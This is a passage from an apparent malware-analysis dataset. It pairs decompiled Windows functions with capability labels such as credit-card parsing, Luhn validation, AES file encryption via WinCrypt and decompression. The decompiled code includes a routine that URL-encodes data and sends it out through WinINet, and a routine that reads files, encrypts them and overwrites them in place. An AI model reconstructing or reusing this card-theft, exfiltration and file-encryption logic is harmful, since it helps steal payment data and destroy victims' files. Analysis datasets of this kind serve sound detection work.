        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407977(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004120fc(0xc);\n    piVar1 = *(unaff_EBP + 8);\n    uVar6 = *(unaff_EBP + 0xc) | 7;\n    if (uVar6 < 0x7fffffff) {\n        *(unaff_EBP + -0x14) = piVar1[5];\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar2 = *(unaff_EBP + -0x14);\n        if ((uVar6 / 3 < uVar2) && (uVar6 = uVar2 + piVar1[5],  0x7ffffffe - uVar2 < piVar1[5])) {\n            uVar6 = 0x7ffffffe;\n        }\n    }\n    else {\n        uVar6 = *(unaff_EBP + 0xc);\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar4 = fcn.00407b33();\n    *(unaff_EBP + -0x18) = uVar4;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        piVar5 = piVar1;\n        if (7 < piVar1[5]) {\n            piVar5 = *piVar1;\n        }\n        fcn.0040b880(*(unaff_EBP + -0x18), piVar5, *(unaff_EBP + 0x10) * 2);\n    }\n    fcn.0040748c(1);\n    piVar5 = *(unaff_EBP + -0x18);\n    *piVar1 = piVar5;\n    piVar1[5] = uVar6;\n    iVar3 = *(unaff_EBP + 0x10);\n    piVar1[4] = iVar3;\n    if (uVar6 < 8) {\n        piVar5 = piVar1;\n    }\n    *(piVar5 + iVar3 * 2) = 0;\n    fcn.00412132();\n    return;\n}\n",
        "token_count": 602
    },
    "00408847": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408847(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    \n    iVar1 = *param_1;\n    uVar3 = param_1[1] - iVar1 >> 2;\n    if (0x3ffffffe < uVar3) {\n        fcn.0040b79e(0x404564);\n        param_1 = extraout_ECX;\n        uVar3 = extraout_EDX;\n    }\n    uVar3 = uVar3 + 1;\n    uVar2 = param_1[2] - iVar1 >> 2;\n    if (uVar2 < uVar3) {\n        if (0x3fffffff - (uVar2 >> 1) < uVar2) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = uVar2 + (uVar2 >> 1);\n        }\n        if (uVar2 < uVar3) {\n            uVar2 = uVar3;\n        }\n        fcn.00408896(uVar2);\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "00408896": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408896(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t *extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004120fc(8);\n    uVar3 = *(unaff_EBP + 8);\n    if (0x3fffffff < uVar3) {\n        fcn.0040b79e(0x404564);\n        uVar3 = extraout_ECX_00;\n    }\n    if (extraout_ECX[2] - *extraout_ECX >> 2 < uVar3) {\n        arg_8h_00 = fcn.0040892d();\n        *(unaff_EBP + -0x14) = arg_8h_00;\n        *(unaff_EBP + -4) = 0;\n        fcn.0040be70(arg_8h_00, *extraout_ECX, extraout_ECX[1] - *extraout_ECX & 0xfffffffc);\n        *(unaff_EBP + -4) = 0xffffffff;\n        iVar1 = *extraout_ECX;\n        iVar2 = extraout_ECX[1];\n        if (iVar1 != 0) {\n            fcn.0040bd1b(iVar1);\n        }\n        extraout_ECX[2] = arg_8h_00 + *(unaff_EBP + 8) * 4;\n        extraout_ECX[1] = arg_8h_00 + (iVar2 - iVar1 >> 2) * 4;\n        *extraout_ECX = arg_8h_00;\n    }\n    fcn.00412132();\n    return;\n}\n",
        "token_count": 440
    },
    "0040b348": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040b348(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint *arg_24h, uint noname_8, uint noname_9, uint noname_10, int32_t arg_34h, uint32_t arg_38h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint uVar3;\n    uint *puVar4;\n    uint var_24h;\n    uint var_20h;\n    uint var_4h;\n    \n    puVar2 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar2 = &arg_24h;\n    }\n    puVar2 = puVar2 + arg_34h;\n    puVar4 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar4 = &arg_24h;\n    }\n    for (; puVar4 != puVar2; puVar4 = puVar4 + 1) {\n        if (*puVar4 == '+') {\n            *puVar4 = '.';\n        }\n    }\n    puVar2 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar2 = &arg_24h;\n    }\n    puVar2 = puVar2 + arg_34h;\n    puVar4 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar4 = &arg_24h;\n    }\n    for (; puVar4 != puVar2; puVar4 = puVar4 + 1) {\n        if (*puVar4 == '/') {\n            *puVar4 = '_';\n        }\n    }\n    puVar2 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar2 = &arg_24h;\n    }\n    puVar2 = puVar2 + arg_34h;\n    puVar4 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar4 = &arg_24h;\n    }\n    for (; puVar4 != puVar2; puVar4 = puVar4 + 1) {\n        if (*puVar4 == '=') {\n            *puVar4 = '-';\n        }\n    }\n    arg_8h_00 = (*_sym.imp.WININET.dll_InternetOpenA)(0x4045fc, 0, 0, 0, 0);\n    puVar2 = fcn.00407008(&arg_8h);\n    if (0xf < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    uVar3 = (*_sym.imp.WININET.dll_InternetOpenUrlA)(arg_8h_00, puVar2, 0, 0, 0x80000000, 0);\n    fcn.0040571f(1);\n    pcVar1 = _sym.imp.WININET.dll_InternetCloseHandle;\n    (*_sym.imp.WININET.dll_InternetCloseHandle)();\n    (*pcVar1)(uVar3);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040b864(arg_8h_00);\n    return;\n}\n",
        "token_count": 771
    },
    "004056e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004056e0(void)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_EBX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = *unaff_EBX;\n    if (iVar2 != 0) {\n        iVar1 = unaff_EBX[1];\n        for (; iVar2 != iVar1; iVar2 = iVar2 + 0x1c) {\n            fcn.0040571f(1);\n        }\n        fcn.0040bd1b(*unaff_EBX);\n    }\n    *unaff_EBX = 0;\n    unaff_EBX[1] = 0;\n    unaff_EBX[2] = 0;\n    return;\n}\n",
        "token_count": 165
    },
    "004057c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004057c3(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint unaff_ESI;\n    uint *puVar5;\n    uint var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint32_t var_28h;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_40h = 0x401e68;\n    do {\n        fcn.0040702c(*var_40h);\n        fcn.0040723c();\n        puVar3 = var_20h;\n        if (var_ch < 0x10) {\n            puVar3 = &var_20h;\n        }\n        iVar2 = fcn.0040d730(puVar3);\n        iVar4 = 0;\n        if (0 < iVar2) {\n            do {\n                fcn.00407008(&var_20h);\n                puVar3 = var_20h;\n                if (var_ch < 0x10) {\n                    puVar3 = &var_20h;\n                }\n                puVar5 = var_3ch;\n                if (var_28h < 0x10) {\n                    puVar5 = &var_3ch;\n                }\n                uVar1 = (*_sym.imp.USER32.dll_CharUpperA)(*(puVar3 + iVar4));\n                *(puVar5 + iVar4) = uVar1;\n                fcn.0040723c();\n                fcn.0040571f(1);\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < iVar2);\n        }\n        iVar4 = 0;\n        if (0 < iVar2) {\n            do {\n                fcn.00407008(&var_20h);\n                puVar3 = var_3ch;\n                if (var_28h < 0x10) {\n                    puVar3 = &var_3ch;\n                }\n                uVar1 = (*_sym.imp.USER32.dll_CharUpperA)(*(puVar3 + iVar4));\n                *(puVar3 + iVar4) = uVar1;\n                fcn.0040723c();\n                fcn.0040571f(1);\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < iVar2);\n        }\n        for (; -1 < iVar2; iVar2 = iVar2 + -1) {\n            puVar3 = var_20h;\n            if (var_ch < 0x10) {\n                puVar3 = &var_20h;\n            }\n            uVar1 = (*_sym.imp.USER32.dll_CharUpperA)(*(puVar3 + iVar2));\n            *(puVar3 + iVar2) = uVar1;\n            fcn.0040723c();\n        }\n        fcn.0040571f(1);\n        var_40h = var_40h + 1;\n    } while (var_40h < 0x401e9c);\n    fcn.0040b864(unaff_ESI);\n    return;\n}\n",
        "token_count": 713
    },
    "00405fd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405fd0(void)\n\n{\n    uint arg_ch;\n    uint noname_1;\n    uint arg_ch_00;\n    uint noname_1_00;\n    uint arg_ch_01;\n    uint noname_1_01;\n    uint arg_ch_02;\n    uint noname_1_02;\n    uint arg_ch_03;\n    uint noname_1_03;\n    uint arg_ch_04;\n    uint noname_1_04;\n    uint arg_ch_05;\n    uint arg_8h;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint in_stack_fffffa50;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint in_stack_fffffa60;\n    uint in_stack_fffffa64;\n    uint in_stack_fffffa68;\n    uint in_stack_fffffa6c;\n    uint in_stack_fffffa70;\n    uint var_574h;\n    uint var_570h;\n    uint var_56ch;\n    uint var_568h;\n    uint var_564h;\n    uint var_560h;\n    uint var_55ch;\n    uint var_558h;\n    uint var_554h;\n    uint var_550h;\n    uint var_54ch;\n    uint var_548h;\n    uint var_544h;\n    uint var_528h;\n    uint var_50ch;\n    uint var_4f0h;\n    uint var_4d4h;\n    uint var_4b8h;\n    uint var_49ch;\n    uint var_480h;\n    uint var_464h;\n    uint var_448h;\n    uint var_42ch;\n    uint var_410h;\n    uint var_3f4h;\n    uint var_3d8h;\n    uint var_3bch;\n    uint var_3a0h;\n    uint var_384h;\n    uint var_368h;\n    uint var_34ch;\n    uint var_330h;\n    uint var_314h;\n    uint var_2f8h;\n    uint var_2dch;\n    uint var_2c0h;\n    uint var_2a4h;\n    uint var_288h;\n    uint var_26ch;\n    uint var_250h;\n    uint var_234h;\n    uint var_218h;\n    uint var_1fch;\n    uint var_1e0h;\n    uint var_1c4h;\n    uint var_1a8h;\n    uint var_18ch;\n    uint var_170h;\n    uint var_154h;\n    uint var_138h;\n    uint var_11ch;\n    uint var_100h;\n    uint var_e4h;\n    uint var_c8h;\n    uint var_ach;\n    uint var_90h;\n    uint var_74h;\n    uint var_58h;\n    uint var_3ch;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    uVar7 = 0x404190;\n    fcn.0040702c(0x404190);\n    fcn.0040b24c(uVar7, in_stack_fffffa60, in_stack_fffffa64, in_stack_fffffa68, in_stack_fffffa6c, in_stack_fffffa70);\n    uVar6 = 0x4041a0;\n    fcn.0040702c(0x4041a0);\n    uVar5 = 0x406017;\n    fcn.0040b24c(uVar6, uVar7, in_stack_fffffa60, in_stack_fffffa64, in_stack_fffffa68, in_stack_fffffa6c);\n    uVar4 = 0x404200;\n    fcn.0040702c(0x404200);\n    uVar3 = 0x40603f;\n    fcn.0040b24c(uVar4, in_stack_fffffa50, uVar5, uVar6, uVar7, in_stack_fffffa60);\n    uVar7 = 0x404220;\n    fcn.0040702c(0x404220);\n    uVar2 = 0x406063;\n    fcn.0040b24c(uVar7, uVar3, uVar4, in_stack_fffffa50, uVar5, uVar6);\n    uVar5 = 0x401f28;\n    fcn.00407008(0x401f28);\n    fcn.0040b24c(uVar5, uVar2, uVar7, uVar3, uVar4, in_stack_fffffa50);\n    uVar1 = 0x404254;\n    fcn.0040702c(0x404254);\n    uVar6 = 0x4060a4;\n    fcn.0040b24c(uVar1, uVar5, uVar2, uVar7, uVar3, uVar4);\n    arg_8h = 0x401f0c;\n    fcn.00407008(0x401f0c);\n    fcn.0040b24c(arg_8h, uVar6, uVar1, uVar5, uVar2, uVar7);\n    uVar7 = 0x404270;\n    fcn.0040702c(0x404270);\n    noname_1_04 = 0x4060ea;\n    fcn.0040b24c(uVar7, arg_8h, uVar6, uVar1, uVar5, uVar2);\n    uVar5 = 0x404284;\n    fcn.0040702c(0x404284);\n    noname_1_03 = 0x40610e;\n    fcn.0040b24c(uVar5, noname_1_04, uVar7, arg_8h, uVar6, uVar1);\n    uVar6 = 0x4042b8;\n    fcn.0040702c(0x4042b8);\n    noname_1_02 = 0x406132;\n    fcn.0040b24c(uVar6, noname_1_03, uVar5, noname_1_04, uVar7, arg_8h);\n    uVar7 = 0x404308;\n    fcn.0040702c(0x404308);\n    noname_1_01 = 0x406156;\n    fcn.0040b24c(uVar7, noname_1_02, uVar6, noname_1_03, uVar5, noname_1_04);\n    arg_ch_05 = 0x40426c;\n    uVar5 = 0x404380;\n    fcn.0040702c(0x404380);\n    noname_1_00 = 0x40617a;\n    fcn.0040b24c(uVar5, noname_1_01, uVar7, noname_1_02, uVar6, noname_1_03);\n    arg_ch_04 = 0x40426c;\n    uVar6 = 0x4043d8;\n    fcn.0040702c(0x4043d8);\n    noname_1 = 0x40619e;\n    fcn.0040b24c(uVar6, noname_1_00, uVar5, noname_1_01, uVar7, noname_1_02);\n    arg_ch_03 = 0x4041f8;\n    uVar7 = 0x404424;\n    fcn.0040702c(0x404424);\n    uVar4 = 0x4061c2;\n    fcn.0040b24c(uVar7, noname_1, uVar6, noname_1_00, uVar5, noname_1_01);\n    arg_ch_02 = 0x40426c;\n    uVar5 = 0x404448;\n    fcn.0040702c(0x404448);\n    uVar3 = 0x4061e6;\n    fcn.0040b24c(uVar5, uVar4, uVar7, noname_1, uVar6, noname_1_00);\n    arg_ch_01 = 0x402024;\n    uVar2 = 0x404470;\n    fcn.0040702c(0x404470);\n    uVar1 = 0x40620a;\n    fcn.0040b24c(uVar2, uVar3, uVar5, uVar4, uVar7, noname_1);\n    arg_ch_00 = 0x4041f8;\n    uVar6 = 0x4044b4;\n    fcn.0040702c(0x4044b4);\n    uVar7 = 0x40622a;\n    fcn.0040b24c(uVar6, uVar1, uVar2, uVar3, uVar5, uVar4);\n    arg_ch = 0x402008;\n    uVar5 = 0x4044c0;\n    fcn.0040702c(0x4044c0);\n    fcn.0040b24c(uVar5, uVar7, uVar6, uVar1, uVar2, uVar3);\n    fcn.00407c1c(&fcn.00405fd0::var_18ch, uVar4);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, arg_ch);\n    fcn.00407c40();\n    fcn.00407c1c(&fcn.00405fd0::var_ach, noname_1);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, arg_ch_00);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, noname_1_00);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, arg_ch_01);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, noname_1_01);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, arg_ch_02);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, noname_1_02);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, arg_ch_03);\n    fcn.00407c40();\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, noname_1_03);\n    fcn.00407c40();\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, arg_ch_04);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, noname_1_04);\n    uVar5 = fcn.00407c40();\n    fcn.00407c84(uVar5, arg_ch_05);\n    fcn.00407c1c(&fcn.00405fd0::var_90h, arg_8h);\n    fcn.00407291();\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    uVar5 = 1;\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040571f(1);\n    fcn.0040b864(uVar5);\n    return;\n}\n",
        "token_count": 3157
    },
    "00406682": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406682(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint lpNumberOfBytesWritten;\n    int32_t var_60h;\n    int32_t lpBuffer;\n    uint var_58h;\n    uint var_3ch;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    lpBuffer = fcn.0040b859(*0x402088);\n    puVar2 = *0x402078;\n    if (*0x40208c < 0x10) {\n        puVar2 = 0x402078;\n    }\n    puVar2 = puVar2 + *0x402088;\n    puVar1 = *0x402078;\n    if (*0x40208c < 0x10) {\n        puVar1 = 0x402078;\n    }\n    if (puVar1 != puVar2) {\n        iVar3 = lpBuffer - puVar1;\n        do {\n            puVar1[iVar3] = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (puVar1 != puVar2);\n    }\n    fcn.0040b44d(&var_58h);\n    fcn.0040806c(&arg_8h);\n    fcn.00407ccb();\n    fcn.0040d7bb(0x4044e0);\n    fcn.00407fd4(0x4044e0);\n    fcn.00407ccb();\n    if (var_ch < 8) {\n        var_20h = &var_20h;\n    }\n    var_60h = (*_sym.imp.KERNEL32.dll_CreateFileW)(var_20h, 0xc0000000, 0, 0, 2, 0x80, 0);\n    arg_8h_00 = 1;\n    fcn.0040748c(1);\n    fcn.0040748c(1);\n    fcn.0040748c(1);\n    iVar3 = var_60h;\n    if (var_60h != 0) {\n        (*_sym.imp.KERNEL32.dll_SetFilePointer)(var_60h, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar3, lpBuffer, *0x402088, &lpNumberOfBytesWritten, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    fcn.0040d85a(lpBuffer);\n    fcn.0040748c(1);\n    fcn.0040b864(arg_8h_00);\n    return;\n}\n",
        "token_count": 635
    },
    "00406886": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "terminate process",
            "write file on Windows",
            "get file size",
            "initialize hashing via WinCrypt",
            "read file on Windows",
            "encrypt data using AES via WinAPI",
            "hash data via WinCrypt",
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406886(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    uint32_t arg_1ch_00;\n    uint uVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    code *pcVar8;\n    bool bVar9;\n    int64_t iVar10;\n    uint32_t in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uint *in_stack_fffffecc;\n    uint32_t in_stack_fffffed0;\n    uint noname_4_00;\n    uint uVar11;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint var_9ch;\n    uint hBaseData;\n    uint lpNumberOfBytesRead;\n    int32_t var_90h;\n    uint phKey;\n    uint pdwDataLen;\n    uint lpNumberOfBytesWritten;\n    uint32_t nNumberOfBytesToWrite;\n    int32_t var_7ch;\n    uint lpBuffer;\n    uint32_t nNumberOfBytesToRead;\n    int32_t var_70h;\n    uint32_t var_65h;\n    uint32_t hObject;\n    uint var_5ch;\n    uint *var_40h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint *var_24h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_8h;\n    \n    var_8h = *0x401304 ^ &stack0xfffffffc;\n    uVar11 = 0x4044fc;\n    fcn.0040702c(0x4044fc);\n    puVar4 = &fcn.00406886::var_5ch;\n    fcn.0040b535(0x20, uVar11, in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40);\n    fcn.00407008(puVar4);\n    fcn.004094d3(&fcn.00406886::var_40h, puVar4, uVar11, in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c, \n                 in_stack_ffffff40);\n    puVar6 = &fcn.00406886::var_40h;\n    fcn.00407008(puVar6);\n    fcn.00409390(&fcn.00406886::var_24h, puVar6, puVar4, uVar11, in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c\n                );\n    var_65h._0_1_ = 10;\n    puVar4 = var_24h;\n    if (var_10h < 0x10) {\n        puVar4 = &fcn.00406886::var_24h;\n    }\n    puVar6 = var_24h;\n    if (var_10h < 0x10) {\n        puVar6 = &fcn.00406886::var_24h;\n    }\n    fcn.00407bd2(&fcn.00406886::var_7ch, puVar6, puVar4 + var_14h);\n    puVar4 = var_24h;\n    if (var_10h < 0x10) {\n        puVar4 = &fcn.00406886::var_24h;\n    }\n    fcn.00407136(var_7ch, puVar4 + var_14h);\n    var_65h._0_1_ = 0xd;\n    puVar4 = var_24h;\n    if (var_10h < 0x10) {\n        puVar4 = &fcn.00406886::var_24h;\n    }\n    puVar6 = var_24h;\n    if (var_10h < 0x10) {\n        puVar6 = &fcn.00406886::var_24h;\n    }\n    fcn.00407bd2(&fcn.00406886::var_7ch, puVar6, puVar4 + var_14h);\n    puVar4 = var_24h;\n    if (var_10h < 0x10) {\n        puVar4 = &fcn.00406886::var_24h;\n    }\n    fcn.00407136(var_7ch, puVar4 + var_14h);\n    pcVar8 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    var_9ch = 0;\n    puVar4 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar4 = &fcn.00406886::var_40h;\n    }\n    iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(puVar4, var_30h, 1, 0, &fcn.00406886::var_9ch, 0, 0);\n    if (iVar2 != 0) goto code_r0x004069ae;\n    while( true ) {\n        do {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x004069ae:\n            uVar11 = fcn.0040b859(var_9ch);\n            puVar4 = var_40h;\n            if (var_2ch < 0x10) {\n                puVar4 = &fcn.00406886::var_40h;\n            }\n            iVar2 = (*pcVar8)(puVar4, var_30h, 1, uVar11, &fcn.00406886::var_9ch, 0, 0);\n        } while (iVar2 == 0);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptCreateHash)(*0x414768, 0x800c, 0, 0, &fcn.00406886::hBaseData);\n        if (((iVar2 != 0) && (iVar2 = (*_sym.imp.ADVAPI32.dll_CryptHashData)(hBaseData, uVar11, 0x40, 0),  iVar2 != 0))\n           && (iVar2 = (*_sym.imp.ADVAPI32.dll_CryptDeriveKey)(*0x414768, 0x660e, hBaseData, 0, &fcn.00406886::phKey), \n              iVar2 != 0)) break;\n        (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(*0x414768, 0);\n    }\n    fcn.0040d85a(uVar11);\n    var_7ch = fcn.0040b859(var_14h);\n    puVar4 = var_24h;\n    if (var_10h < 0x10) {\n        puVar4 = &fcn.00406886::var_24h;\n    }\n    puVar4 = puVar4 + var_14h;\n    if (var_10h < 0x10) {\n        var_24h = &fcn.00406886::var_24h;\n    }\n    if (var_24h != puVar4) {\n        iVar2 = var_7ch - var_24h;\n        do {\n            *(var_24h + iVar2) = *var_24h;\n            var_24h = var_24h + 1;\n        } while (var_24h != puVar4);\n    }\n    var_90h = fcn.0040b859(*0x402034);\n    puVar7 = *0x402024;\n    if (*0x402038 < 0x10) {\n        puVar7 = 0x402024;\n    }\n    puVar7 = puVar7 + *0x402034;\n    puVar3 = *0x402024;\n    if (*0x402038 < 0x10) {\n        puVar3 = 0x402024;\n    }\n    if (puVar3 != puVar7) {\n        iVar2 = var_90h - puVar3;\n        do {\n            puVar3[iVar2] = *puVar3;\n            puVar3 = puVar3 + 1;\n        } while (puVar3 != puVar7);\n    }\n    puVar4 = arg_8h;\n    if (arg_1ch < 8) {\n        puVar4 = &fcn.00406886::arg_8h;\n    }\n    arg_1ch_00 = (*_sym.imp.KERNEL32.dll_CreateFileW)(puVar4, 0xc0000000, 0, 0, 3, 0x80, 0);\n    hObject = arg_1ch_00;\n    if (arg_1ch_00 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(arg_1ch_00, &fcn.00406886::nNumberOfBytesToRead);\n        pcVar8 = _sym.imp.KERNEL32.dll_SetFilePointer;\n        if ((var_70h < 0) || ((var_70h < 1 && (nNumberOfBytesToRead < 0x61a801)))) {\n            stack0xffffff98 = 0;\n            while( true ) {\n                noname_4_00 = 0;\n                uVar11 = 0x10;\n                iVar2 = var_70h;\n                arg_1ch_00 = nNumberOfBytesToRead;\n                iVar10 = fcn.00412200();\n                if (iVar10 == 0) break;\n                bVar9 = nNumberOfBytesToRead != 0;\n                nNumberOfBytesToRead = nNumberOfBytesToRead - 1;\n                var_70h = var_70h + -1 + bVar9;\n                unique0x00007a80 = stack0xffffff98 + 1;\n            }\n            if ((var_70h < 0) || ((var_70h < 1 && (nNumberOfBytesToRead < 0x19001)))) {\n                uVar5 = fcn.0040b859(nNumberOfBytesToRead);\n                pcVar8 = _sym.imp.KERNEL32.dll_SetFilePointer;\n                in_stack_fffffec4 = 0;\n                in_stack_fffffec0 = hObject;\n                lpBuffer = uVar5;\n                (*_sym.imp.KERNEL32.dll_SetFilePointer)(hObject, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_ReadFile)\n                          (hObject, uVar5, nNumberOfBytesToRead, &fcn.00406886::lpNumberOfBytesRead, 0);\n                nNumberOfBytesToWrite = nNumberOfBytesToRead;\n                (*_sym.imp.ADVAPI32.dll_CryptEncrypt)\n                          (phKey, 0, 0, 0, uVar5, &fcn.00406886::nNumberOfBytesToWrite, nNumberOfBytesToRead);\n                (*pcVar8)(hObject, 0, 0, 0);\n            }\n            else {\n                lpBuffer = fcn.0040b859(0x19000);\n                pcVar8 = _sym.imp.KERNEL32.dll_SetFilePointer;\n                in_stack_fffffec4 = 0;\n                in_stack_fffffec0 = hObject;\n                (*_sym.imp.KERNEL32.dll_SetFilePointer)(hObject, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, lpBuffer, 0x19000, &fcn.00406886::lpNumberOfBytesRead, 0);\n                nNumberOfBytesToWrite = 0x19000;\n                (*_sym.imp.ADVAPI32.dll_CryptEncrypt)\n                          (phKey, 0, 0, 0, lpBuffer, &fcn.00406886::nNumberOfBytesToWrite, 0x19000);\n                (*pcVar8)(hObject, 0, 0, 0);\n                uVar5 = lpBuffer;\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n            (*_sym.imp.KERNEL32.dll_WriteFile)\n                      (hObject, uVar5, nNumberOfBytesToWrite, &fcn.00406886::lpNumberOfBytesWritten, 0);\n            fcn.0040d85a(lpBuffer);\n            (*pcVar8)(hObject, nNumberOfBytesToRead + stack0xffffff98, 0, 0);\n            (*pcVar1)(hObject, 